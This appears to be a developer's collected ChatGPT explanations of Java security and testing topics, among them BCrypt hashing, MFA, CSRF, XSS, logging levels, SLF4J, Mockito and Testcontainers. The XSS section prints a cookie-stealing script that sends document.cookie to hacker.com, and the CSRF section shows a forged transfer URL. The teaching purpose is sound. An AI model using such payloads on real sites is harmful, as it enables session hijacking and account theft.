Password Encoding Algorithm (Simple Explanation)
A password encoding algorithm is a way to convert a password into a secure format so that it cannot be easily read or hacked. 
This process is known as hashing or encryption.

🔹 Why Encode Passwords?
Storing plain text passwords is risky.
If a hacker gets access to the database, they can see all passwords.
Encoding makes it impossible (or very hard) to get the original password back.
🔹 How Does It Work?
User enters a password → Example: "MySecret123"
Algorithm converts it into a coded format → Example output:
"sdf3$@1klj!90d83f" (This is unreadable and cannot be reversed)
This encoded password is stored in the database instead of the original password.
When the user logs in, their entered password is encoded again and compared with the stored encoded password.
If both match, access is granted.
🔹 Common Password Encoding Algorithms
BCrypt → Secure and slow (prevents fast hacking attacks)
PBKDF2 → Uses multiple iterations to increase security
Argon2 → Modern and highly secure (recommended)
SHA-256 → Fast but less secure (use with salting for better security)
🔹 Example in Java (Spring Security - BCrypt)
java
Copy
Edit
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordEncodingExample {
    public static void main(String[] args) {
        BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
        String rawPassword = "MySecret123";
        String encodedPassword = encoder.encode(rawPassword);

        System.out.println("Encoded Password: " + encodedPassword);
    }
}
✅ Each time you run it, the encoded password will be different (because of salting, which adds random data for security).

🔹 Key Points
Hashing is one-way → You cannot decode it back to the original password.
Salting adds random data to prevent attacks.
Use strong algorithms like BCrypt, PBKDF2, or Argon2 for security.
Let me know if you need a more detailed explanation! 🚀


-----------------------------------------------------------------------------------
what is multi factor authentication explain me in simple form 
ChatGPT said:
Multi-Factor Authentication (MFA) - Simple Explanation
Multi-Factor Authentication (MFA) is a security method that requires more than one way to verify your identity before granting access.

Instead of just entering a password, you need to provide an extra layer of security to confirm it's really you.

Example:
Imagine you are logging into your bank account:
1️⃣ Enter your password (something you know)
2️⃣ Enter an OTP sent to your phone (something you have)

Now, even if a hacker steals your password, they still need your phone to access your account.

Common MFA Factors:
✔ Something You Know → Password, PIN
✔ Something You Have → OTP, Phone, Smart Card
✔ Something You Are → Fingerprint, Face ID

💡 Why Use MFA?
🔒 Increases security
🚫 Prevents unauthorized access
📱 Used in banking, emails, and social media
------------------------------------------------------------------
1️⃣ Account Lock-Up Policy (Prevents Multiple Wrong Login Attempts)
This policy locks your account if you enter the wrong password too many times.
Example: If you enter the wrong password 5 times in a row, your account gets temporarily locked for security reasons.
Why? To stop hackers from guessing your password repeatedly (Brute Force Attack).
2️⃣ Password Recovery Policy (Helps You Reset Forgotten Passwords)
Defines how users can recover or reset their password if they forget it.
Example:
Security Questions: "What is your pet's name?"
OTP Verification: Send a one-time password (OTP) to your email or phone.
Reset Link: Send a password reset link via email.
Why? Ensures secure and easy password recovery without exposing accounts to hackers.
3️⃣ SSL & TLS Encryption (Protects Data During Transmission)
SSL (Secure Sockets Layer) and TLS (Transport Layer Security) are security protocols 
that encrypt data when it travels between a user’s browser and a website/server.
Example:
Without SSL/TLS: A hacker can see your password when you log in.
With SSL/TLS: Your password is encrypted (scrambled), making it unreadable for hackers.
Why? Protects sensitive information like passwords, credit card details, and personal data from hackers.
✅ Websites with SSL/TLS use 🔒 HTTPS instead of HTTP (e.g., https://www.bank.com).

Would you like a simple Java example for SSL/TLS? 🚀

----------------------------------------------------------------------------------------


1️⃣ CSRF (Cross-Site Request Forgery) – Tricking You to Perform an Action
A CSRF attack happens when a hacker tricks you into performing an unintended action on a website where you are already logged in.

Example:
You are logged into your bank account (www.bank.com).
A hacker sends you a malicious link (via email or website).
When you click the link, it makes a hidden request to www.bank.com/transfer?amount=5000&to=hacker_account.
Since you are already logged in, the bank thinks you made the request and transfers the money to the hacker.
✅ Prevention:
✔ Use CSRF Tokens to verify real user actions.
✔ Ask for re-authentication (e.g., OTP or password confirmation) for sensitive actions.

---------------------------------------------------------------------------------------------------
XSS (Cross-Site Scripting) – A Simple Explanation
🔴 Problem: A hacker injects malicious JavaScript into a website. When someone visits that page, the script
runs in their browser and can steal data or take control of their session.

Imagine This Scenario:
1️⃣ You visit a website that allows users to post comments.
2️⃣ Normally, people write comments like:

nginx
Copy
Edit
Great product! 👍
3️⃣ But a hacker writes this instead:

html
Copy
Edit
<script>alert("Hacked!");</script>
4️⃣ If the website does not check inputs, it saves this as a comment in the database.
5️⃣ Now, when someone visits the page, their browser sees this script and executes it.
6️⃣ A pop-up appears saying:

Copy
Edit
Hacked!
Real-World Danger
Instead of just a pop-up, a hacker can steal your login session (cookie) using this:

html
Copy
Edit
<script>
document.location="http://hacker.com/steal?cookie=" + document.cookie;
</script>
✅ This sends your session ID to the hacker, allowing them to log into your account.

How to Stay Safe?
✔ Websites must clean inputs (remove <script> before saving).
✔ Use Content Security Policy (CSP) to block harmful scripts.
✔ Never click on suspicious links or enter details on untrusted sites.

💡 In short:
🔹 XSS injects JavaScript into websites.
🔹 When people visit, the script runs in their browser.
🔹 Hackers can steal login info, redirect users, or change content.
---------------------------------------------------------------------------------------------

Logging and Metrics – Simple Explanation
When you build and run software, you need to track what’s happening inside your system. 
This helps in identifying issues, improving performance, and ensuring security. Logging and metrics help with this.

1. Debugging (Fixing Problems)
Logging helps track errors in your code.
If something goes wrong, logs show where and why it happened.
Example: If your app crashes, logs might say, "Database connection failed at 3:05 PM."
2. Traceability (Tracking Actions)
Helps track who did what in your system.
Useful for auditing and monitoring system activity.
Example: If a user complains their order was canceled, logs can show:
"User X canceled order #123 at 2:30 PM."
3. Security (Protecting Data)
Logs help detect unauthorized access or suspicious activities.
Can identify hacking attempts or data breaches.
Example: If someone tries to log in 100 times with the wrong password, logs will flag it as a security risk.
4. Performance Optimization (Making Things Faster)
Metrics track how well the system is running (e.g., speed, memory usage).
Helps find slow parts of an application.
Example: If a webpage takes 5 seconds to load, logs can show why (e.g., slow database queries).
5. Predictive Maintenance (Preventing Failures Before They Happen)
Uses historical logs and metrics to predict future problems.
Helps fix issues before they cause failures.
Example: If a server is getting hotter over time, logs can predict when it might overheat and crash.
In short:

Logging records events and errors.
Metrics track system performance.
Together, they help in fixing problems, improving speed, securing data, and preventing failures. 🚀
-----------------------------------------------------------------------------------------------------------------
Different Levels of Logs (Explained Simply)
Understanding Different Levels of Logs in Detail
Logging is a way to record important events in your application. It helps in debugging, monitoring, and understanding 
how your system behaves. Different levels of logging are used based on the importance and severity of the message.

1. TRACE (Most Detailed Logging - Too Much Information)
🔹 What is it?
TRACE logs contain the most detailed information about the application's execution.
It records every small step, function call, and variable change.
🔹 When to Use?
When you need deep debugging and want to see every execution step.
For example, if you're trying to track how a value is changing inside a loop.
🔹 Example Scenario
Imagine you have a function that calculates the total price of items in a cart. If you enable TRACE, you can see:
✅ When the function starts.
✅ What each item’s price is.
✅ How the total is updated step by step.

📌 Problem: TRACE logs create too much data, making it hard to read. That’s why it is rarely enabled in production.

2. DEBUG (Used for Debugging - Useful for Developers)
🔹 What is it?
DEBUG logs provide information useful for developers while coding.
It helps track variable values, function calls, and conditions.
🔹 When to Use?
When developing a new feature or fixing a bug.
When you want to see values inside the code but don’t want excessive data like TRACE.
🔹 Example Scenario
You are working on an order placement system. With DEBUG logs enabled, you can track:
✅ When a user adds an item to the cart.
✅ The total price before and after tax is applied.
✅ Whether the discount code is applied correctly.

📌 Debug logs are usually disabled in production because they expose too much internal information.

3. INFO (General Information - Normal Application Behavior)
🔹 What is it?
INFO logs track general events in the application that are useful but not required for debugging.
They give an idea of how the application is working.
🔹 When to Use?
When you need a record of key events (e.g., when an application starts or a user logs in).
These logs help in monitoring but don’t contain detailed debugging data.
🔹 Example Scenario
In a banking application, INFO logs can track:
✅ When a user logs into their account.
✅ When a transaction is successfully completed.
✅ When a scheduled job (like generating a monthly statement) starts.

📌 INFO logs are often enabled in production because they help in monitoring system behavior.

4. WARN (Warning - Something Unusual Happened, But App Still Works)
🔹 What is it?
WARN logs indicate potential problems, but they don’t stop the application.
They act as early warnings for possible future failures.
🔹 When to Use?
When something unexpected happens, but the system can recover.
Example: A database query is slower than expected, but the result is still returned.
🔹 Example Scenario
In an e-commerce website, WARN logs might be used for:
✅ High memory usage – If memory usage is above 80%, log a warning.
✅ Slow database queries – If a query takes more than 2 seconds, log a warning.
✅ API rate limits reached – If a user makes too many API requests in a short time.

📌 Warnings don’t stop the application but should be investigated to prevent future failures.

5. ERROR (Something Went Wrong, But the App is Still Running)
🔹 What is it?
ERROR logs indicate failures in the application.
The application continues to run, but an operation has failed.
🔹 When to Use?
When something cannot be recovered automatically.
Example: A failed database connection, an API request failure, or an unexpected user input error.
🔹 Example Scenario
In an online payment system, ERROR logs might be triggered when:
✅ A payment gateway fails to process a transaction.
✅ A database fails to update an order status.
✅ An API call to another service fails (e.g., fetching user details from a remote server).

📌 ERROR logs should be monitored closely because they indicate actual failures.

6. FATAL (Critical Failure - App Might Crash!)
🔹 What is it?
FATAL logs indicate severe errors that will stop the application.
The system cannot recover and must be restarted.
🔹 When to Use?
When a situation arises where the application cannot function anymore.
Example: A missing essential configuration file or a complete database failure.
🔹 Example Scenario
In a healthcare system managing patient records, a FATAL log might be triggered if:
✅ The database crashes, and no patient records can be accessed.
✅ The application loses connection to all services.
✅ A critical configuration file is missing, making the system unable to start.

📌 FATAL logs are rare but require immediate attention.


-----------------------------------------------------------------------------------


SLF4J (Simple Logging Facade for Java) - Explained in Simple Terms
What is SLF4J?
SLF4J (Simple Logging Facade for Java) is not a logging framework itself. Instead, it acts as a middle layer that allows your 
application to work with different logging frameworks like:
✅ Log4j
✅ Logback
✅ Java Util Logging (JUL)

Think of SLF4J as a universal remote control for logs. Instead of directly using a specific logging library (like Log4j), 
you use SLF4J, and it can redirect logs to any logging system you choose.

Why Use SLF4J? (Benefits)
✅ 1. Flexibility
You don’t need to commit to a single logging framework.
You can switch from Log4j to Logback or any other logging framework without changing your entire codebase.
✅ 2. Simplicity
SLF4J provides a common API that is easy to use.
It reduces dependencies on specific logging frameworks.
✅ 3. Better Performance
SLF4J supports parameterized logging, which avoids unnecessary string concatenation.
Example: Instead of "User " + userId + " logged in", it uses logger.info("User {} logged in", userId), which is more efficient.
✅ 4. Supports MDC (Mapped Diagnostic Context)
MDC helps to track logs per request, which is useful in multi-threaded applications.
How SLF4J Works Internally?
You write logs using the SLF4J API (logger.info("Message")).
SLF4J forwards logs to the actual logging framework (like Logback or Log4j).
The logging framework processes the logs and writes them to files, consoles, or external systems.
🔹 Example Flow:
🚀 Your application → 🛠️ SLF4J API → 📢 Logback (or any other logging framework) → 📜 Logs are stored

SLF4J with Different Logging Frameworks
SLF4J can work with multiple logging backends. Some popular ones are:

Logging Framework	Description
Logback	Modern and powerful logging framework (recommended)
Log4j 2	An improved version of Log4j with better performance
Java Util Logging (JUL)	Built-in logging in Java but less flexible
📌 If you don’t specify a logging framework, SLF4J will use a default no-operation (NOP) implementation, which means 
logs won’t be recorded anywhere.

---------------------------------------------------------------------------------------------

Here’s a simple explanation of each security consideration:

Sensitive Data Redaction

Never log sensitive information like passwords, API keys, or personal data (PI - Personally Identifiable Information).
Instead, replace them with ***** or REDACTED in logs.
Log Level Control

Use different levels for logging: INFO, DEBUG, ERROR, etc.
Avoid logging sensitive data at DEBUG or INFO levels.
Log File Access Control

Restrict access to log files.
Only authorized users should be able to view or modify them.
Log Rotation and Retention

Logs should not grow indefinitely.
Rotate (archive and create new logs) and delete old logs after a certain period to avoid storage issues.
Sanitization of Input

Clean user inputs to remove harmful content before storing in logs.
This prevents security risks like script injection.
Protection Against Log Injection

Attackers may insert fake log entries using newline characters (\n) or special characters.
Escape or filter these characters to ensure logs remain accurate and safe.
---------------------------------------------------------------------------------------------------

1. JUnit

    What is it?
    JUnit is a framework (set of tools) used in Java programming for writing and running unit tests. It's like a helper that 
lets you check if individual parts of your code (like functions or methods) are working correctly.

    Why is it useful?
    It helps developers make sure that their code behaves as expected. If a unit test fails, it tells you that something 
might be wrong in that specific part of your code, which helps in debugging and improving the code.

    Example:
    If you have a method that adds two numbers, you can write a JUnit test to check if the addition works correctly.

2. Unit Testing

    What is it?
    Unit testing is the process of testing individual pieces of code, usually small parts like functions or methods, to 
ensure they work correctly in isolation.

    Why is it important?
    Unit testing helps catch problems early. It tests each part of the program on its own before they are integrated with 
the rest of the system. This ensures that the program works properly as you build it, and it makes the code more reliable.

    Example:
    You might write a unit test for a method that calculates the area of a rectangle. The test would check if the area is
calculated correctly for different inputs.

3. Mockito

    What is it?
    Mockito is a library used in Java to make mock objects. It helps with unit testing by allowing you to create "fake" 
objects that simulate real dependencies your code interacts with. These mock objects can be used to test your code without 
needing to rely on real external systems (like databases, APIs, etc.).

    Why is it useful?
    In real applications, some parts might depend on things like external systems (like a database or a web service).
These dependencies might be slow or not available during testing. Mockito allows you to create mock objects for these
external systems so that you can test your code in isolation, focusing only on the unit being tested.

    Example:
    Suppose your code depends on a database to fetch user data. Instead of connecting to a real database during tests,
you can use Mockito to create a mock database that returns fake data, allowing you to test how your code handles that data 
without actually connecting to a database.

4. Integration Testing

    What is it?
    Integration testing is a type of testing where you test how different parts of your application work together. 
While unit testing focuses on individual pieces, integration testing checks if all the components in the system work together as expected.

    Why is it important?
    Even if each part of the code works well on its own (thanks to unit testing), they might not work correctly when combined. 
Integration testing helps ensure that different parts of the program work together smoothly.

    Example:
    After writing unit tests for a login system (like checking if the password validation works), you would do integration 
testing to check if the whole login process (front-end and back-end working together) functions properly. For example, checking 
if a user can log in with the correct username and password and if the system correctly fetches user data from the database.

In Summary:

    JUnit is a framework for unit testing in Java.
    Unit Testing is testing individual parts of your code (like functions or methods).
    Mockito helps in creating mock objects for testing, especially useful when your code relies on external systems.
    Integration Testing checks if different parts of your application work well together.
-----------------------------------------------------------------------------------------------------------


What is this code doing?
This code is testing a service (StudentsService) that has a method called increementService(). 
The purpose of these tests is to check if the method works as expected.

1. Mocking a Dependency
java
Copy
StudentsDal studentsDal = Mockito.mock(StudentsDal.class);
This line is creating a fake version of the StudentsDal class (called a mock). Normally, StudentsDal would 
talk to a database, but since we don’t need a real database in the test, we create a fake one (mock).
2. The First Test (shouldTestIncreementService)
java
Copy
@Test
public void shouldTestIncreementService() {
    StudentsService studentsService = new StudentsService(studentsDal);
This is the start of the first test.
studentsService is the object you're testing. It's created by using the StudentsDal mock you made earlier.
java
Copy
    int num = 0;
    int result = studentsService.increementService(num);
Here, you’re calling the method increementService() on studentsService. You pass the number 0 into the method, 
and you expect the method to add 1 to it.
The result of that is saved in the result variable.
java
Copy
    Assertions.assertEquals(result, num + 1);
}
This line checks if the result is equal to 1 (since num + 1 is 1).
If result is 1, the test passes. If not, the test fails.
3. The Second Test (shouldFailTestIncreementService)
java
Copy
@Test
public void shouldFailTestIncreementService() {
    StudentsService studentsService = new StudentsService(studentsDal);
    int num = 0;
    int result = studentsService.increementService(num);
    Assertions.assertNotEquals(result, num);
}
This is the second test.
It’s similar to the first one, but here, you’re making sure that the result is not the same as the original number (num), which is 0.
You expect increementService() to change the number (by adding 1), so result should not be 0.
If the result is different from 0, the test will pass.
Summary:
First test: Checks if the increementService() method increases the number by 1.
Second test: Checks if the increementService() method changes the number at all (i.e., it shouldn’t stay the same).

============================================================================================================
What is @SpringBootTest?
@SpringBootTest is an annotation used in Spring Boot tests. It's used to tell Spring that this test should run 
with the full application context.

What does that mean?
Spring Boot has a lot of built-in features that help in building applications (like connecting to databases,
handling web requests, etc.). When you're testing something in Spring Boot, you might want to test not just one
part of the code, but the entire application or certain parts of it that interact with each other.
By adding @SpringBootTest to a test, Spring Boot sets up everything needed to run your test, like it would for 
the real application. This means it will create the actual objects and beans (like services, repositories, etc.) 
as if the application were running.
Why would you use it?
You use @SpringBootTest when you need:

To test components of your application that need the full Spring context (like services that talk to a database).
To test how different parts of your application interact together, not just one isolated part.
------------------------------------------------------------------------------------------------------------------------


1. Annotations:

    @SpringBootTest: This tells Spring Boot to set up a full application context for testing. It starts the application so that
the test can interact with the real components (like controllers, services, etc.).

    @AutoConfigureMockMvc: This sets up the MockMvc object, which is used to send HTTP requests to your controller without 
starting a real server. It's a way to test the API endpoints in isolation.

2. MockMvc:

    MockMvc: It allows you to simulate HTTP requests (like GET, POST) and check the responses. In this case, it's used to test a GET request.

3. Test Method (shouldTestGetStudentsApi):

    @Test: Marks the method as a test method to be executed by the testing framework (like JUnit).

    Inside the method:

        mockMvc.perform(MockMvcRequestBuilders.get("/students/getStudents")): This simulates a GET request to the /students/getStudents
endpoint.

        .andExpect(MockMvcResultMatchers.status().isOk()): This checks that the response status is 200 (OK), meaning the 
request was successful.


-----------------------------------------------------------------------------------------------------------------------------


@DataJpaTest
What it does: This annotation sets up a test environment for JPA (Java Persistence API). It configures a test database, typically an in-memory one like H2, and prepares your Spring Data JPA repositories so you can test them without connecting to an actual production database.

2. @ActiveProfiles("test")
What it does: It tells Spring to use the "test" profile for configuration. In Spring, you can have different configurations for different environments (e.g., dev, test, prod). In this case, it's using a "test" profile, which often has mock data or an embedded test database for testing purposes.

3. public class StudentsDalTestEmbedded {
What it does: This defines the test class named StudentsDalTestEmbedded. It’s where all the test cases for StudentsDal will be written.

4. @Autowired private StudentsDal studentsDal;
What it does: This injects an instance of the StudentsDal class into the test. StudentsDal is the Data Access Layer (DAL) that handles operations related to the "Student" entity in the database, like saving and retrieving students.

5. @Test
What it does: This annotation marks the method below it as a test method. This means that JUnit will run this method as a test when executing your tests.

6. @Order(1)
What it does: This specifies the order in which the test should run. Here, it is saying that this test method should be the first to run if there are multiple test methods. This is useful when the order matters.

7. public void shouldSaveStudent() {
What it does: This is the test method called shouldSaveStudent(). The purpose of this test is to check if saving a student to the database works correctly.

8. Student student = new Student(1, "Rakesh", 19, "JUnit", "Aryabhatta Hostels", "rakesh@gmail.com", "09874562134");
What it does: This line creates a new Student object with some values:

1 is the student ID (usually assigned by the database but here it's hardcoded).

"Rakesh" is the student's name.

19 is the student's age.

"JUnit" is the course or department the student is associated with.

"Aryabhatta Hostels" is the student's address.

"rakesh@gmail.com" is the student's email.

"09874562134" is the student's phone number.

9. Student resultStudent = studentsDal.save(student);
What it does: This line calls the save() method of studentsDal, which saves the student object to 
the database (or in this case, a test database). 
It then stores the result in the variable resultStudent, which should be the student object saved with the database-generated sid (ID) field.

10. assertThat(resultStudent)
What it does: This begins an assertion to check if resultStudent (the saved student) matches 
the original student object. assertThat is part of the assertion library used to verify that the code behaves as expected.

11. .usingRecursiveComparison()
What it does: This tells JUnit to compare the two student objects (resultStudent and student)
field by field, recursively. So it will check if each field of the objects is equal to each other.

12. .ignoringFields("sid")
What it does: Since the sid (student ID) is generated by the database when the student is saved, 
it won't match the ID in the original student object. This line tells JUnit to ignore the sid field during the comparison, 
so the test won't fail just because the IDs are different.

13. .isEqualTo(student);
What it does: This completes the assertion and checks if the resultStudent (the saved student) 
is equal to the original student object, ignoring the sid. If they are equal (except for sid), the test will pass.

-------------------------------------------------------------------------------

Class Definition:
java
Copy
@DataJpaTest
@Testcontainers
@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)
public class StudentsDalTest {
@DataJpaTest: This is a Spring annotation that configures a test environment with JPA 
(Java Persistence API) support. It sets up an in-memory database and only tests JPA components like repositories.

@Testcontainers: This annotation tells Spring to use Docker containers for integration testing.
It will start the MySQLContainer for our test.

@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE): This annotation 
prevents Spring Boot from replacing the configured database with an in-memory database. It ensures that we use 
the actual MySQL container (the one defined below) for the test.

Static MySQLContainer Definition:
java
Copy
private static final MySQLContainer MY_SQL_CONTAINER = new MySQLContainer("mysql:latest")
                .withDatabaseName("student-test-db")
                .withUsername("testUser")
                .withPassword("password");
This defines a static variable MY_SQL_CONTAINER of type MySQLContainer. It sets up a Docker container 
that uses the latest version of the MySQL image (mysql:latest).

.withDatabaseName("student-test-db"): Sets the name of the database inside the MySQL container to "student-test-db".

.withUsername("testUser"): Sets the username for connecting to MySQL as "testUser".

.withPassword("password"): Sets the password for the MySQL user as "password".

Static Initialization Block:
java
Copy
static {
    MY_SQL_CONTAINER.start();
}
This block of code is executed once when the class is loaded. It starts the MY_SQL_CONTAINER that we defined above,
effectively running a MySQL container for the test.

Dynamic Property Registration:
java
Copy
@DynamicPropertySource
static void registerDatabaseProperties(DynamicPropertyRegistry registry) {
    registry.add("spring.datasource.url", MY_SQL_CONTAINER::getJdbcUrl);
    registry.add("spring.datasource.username", MY_SQL_CONTAINER::getUsername);
    registry.add("spring.datasource.password", MY_SQL_CONTAINER::getPassword);
}
@DynamicPropertySource: This annotation allows us to dynamically provide properties to Spring during the test.

registerDatabaseProperties: This static method registers the database connection properties (like the URL, username, 
and password) to Spring’s DynamicPropertyRegistry.

spring.datasource.url: The JDBC URL to connect to the MySQL container.

spring.datasource.username: The username for the database connection.

spring.datasource.password: The password for the database connection.

Autowired DAL (Data Access Layer):
java
Copy
@Autowired
StudentsDal studentsDal;
This is a Spring annotation that automatically injects the StudentsDal (Data Access Layer) into the test class. 
This class will be used to interact with the database (for saving and retrieving student data).

Test Method:
java
Copy
@Test
@Order(1)
public void shouldSaveStudent() {
@Test: This annotation marks the method as a test method that will be executed by the test framework (JUnit in this case).

@Order(1): This annotation indicates that the test method should run in the order specified
(i.e., it’s the first test in this case). It’s useful when you want to specify the execution order of tests.

Create a Student Object:
java
Copy
Student student = new Student(1, 
        "Rakesh", 
        19, 
        "JUnit", 
        "Aryabhatta Hostels", 
        "rakesh@gmail.com", 
        "09874562134");
This creates a Student object with the provided details like:

1: The student's ID.

"Rakesh": Name of the student.

19: Age of the student.

"JUnit": Course name.

"Aryabhatta Hostels": Address.

"rakesh@gmail.com": Email.

"09874562134": Phone number.

Save Student and Compare:
java
Copy
Student resultStudent = studentsDal.save(student);
assertThat(resultStudent)
    .usingRecursiveComparison()
    .ignoringFields("sid")
    .isEqualTo(student);
studentsDal.save(student): This calls the save method of the studentsDal object (which interacts with 
the database) and saves the student object. It returns the saved student, which might include changes like the auto-generated ID.

assertThat(resultStudent): This is a method from AssertJ, a popular assertion library used in tests. 
It asserts that resultStudent (the saved student) should meet certain conditions.

.usingRecursiveComparison(): This allows for a deep comparison between objects, ignoring differences in nested objects or fields.

.ignoringFields("sid"): This tells AssertJ to ignore the sid field during the comparison.
This is likely because sid is auto-generated by the database (i.e., the student ID), and
it may differ between the student object and the saved resultStudent.

.isEqualTo(student): Finally, this checks that the resultStudent object is equivalent to the original student object, ignoring the sid.

-------------------------------------------------------





